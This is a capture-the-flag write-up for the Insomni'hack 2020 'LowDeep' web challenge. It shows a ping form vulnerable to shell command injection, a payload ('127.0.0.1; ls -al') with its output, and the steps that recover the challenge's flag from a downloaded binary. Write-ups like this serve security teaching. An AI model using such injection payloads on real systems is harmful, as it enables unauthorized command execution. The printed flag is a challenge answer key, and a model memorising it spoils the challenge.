# Insomni'hack teaser 2020 – LowDeep

* **Category:** web
* **Points:** 36

## Challenge

> by patacrep & pwndawan
> 
> Try out our new ping platform: http://lowdeep.insomnihack.ch/

## Solution

The website contains a page where you can insert an IP address to ping.

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <title>Insomni'hack 2020 Teaser</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js"></script>
  <style>
  body {
 background-image: url("_res_/img/skull-slim.png");
 background-color: #cccccc;
}
  </style>
</head>

<body>
<div class="container p-3 my-3 bg-dark text-white">
  <h2>LowDeep Plateform </h2>
  <p>That's our new plateform to perform ping the easy way.</p>

  <form action="#" method="post">
    <div class="form-group">
      <label for="ip">Enter the IP address to ping:</label>
      <input type="text" class="form-control" id="ip" name="ipaddr">
    </div>
    <input type="submit" name="submit" value="Submit" class="btn btn-primary" />
    <div>
    	    </div>
  </form>
</div>
</body>
</html>
```

The `ping` command is launched via shell, so a command in the input field can be injected to execute arbitrary operations.

For example `127.0.0.1; ls -al` payload will give the following output.

```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.019 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.019/0.019/0.019/0.000 ms
total 28
drwxr-xr-x 3 root root 4096 Jan 17 09:57 .
drwxr-xr-x 3 root root 4096 Jan 7 16:52 ..
drwxr-xr-x 4 root root 4096 Jan 17 09:57 _res_
-rw-r--r-- 1 root root 1367 Jan 16 15:30 index.php
-rw-r--r-- 1 root root 6128 Jan 16 13:10 print-flag
-rw-r--r-- 1 root root 42 Jan 16 15:35 robots.txt 
```

Accessing to `http://lowdeep.insomnihack.ch/print-flag` will download the [`print-flag` file](print-flag).

Using `strings` will print the flag.

```
root@m3ss4p0:~# strings print-flag
/lib64/ld-linux-x86-64.so.2
O0\)
libc.so.6
puts
__cxa_finalize
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
AWAVI
AUATL
[]A\A]A^A_
INS{Wh1le_ld_k1nd_0f_forg0t_ab0ut_th3_x_fl4g}
;*3$"
GCC: (Ubuntu 7.4.0-1ubuntu1~18.04.1) 7.4.0
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment
```

So the flag is the following.

```
INS{Wh1le_ld_k1nd_0f_forg0t_ab0ut_th3_x_fl4g}
```